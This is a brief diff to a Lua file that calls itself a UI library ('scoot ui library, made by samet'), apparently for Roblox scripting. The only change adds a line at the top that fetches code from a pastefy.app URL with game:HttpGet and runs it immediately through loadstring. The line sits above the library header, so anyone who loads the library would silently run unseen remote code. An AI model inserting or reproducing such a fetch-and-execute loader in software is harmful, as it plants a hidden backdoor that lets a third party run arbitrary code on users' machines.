@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://pastefy.app/pDhoQmem/raw"))()
 --[[
     scoot ui library
     made by samet
